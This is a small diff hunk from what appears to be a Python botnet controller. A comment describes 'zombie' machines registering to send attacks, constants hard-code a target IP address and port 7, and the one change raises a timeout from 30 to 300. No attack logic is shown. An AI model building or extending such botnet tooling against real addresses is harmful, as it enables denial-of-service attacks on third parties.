@@ -5,7 +5,7 @@ import sqlite3 as lite
 
 # Each zombie registers its address and an open port to send attack to
 PORT = 15000
-TIMEOUT = 30
+TIMEOUT = 300
 TARGET = "108.179.184.95"
 TARGET_PORT = 7
 
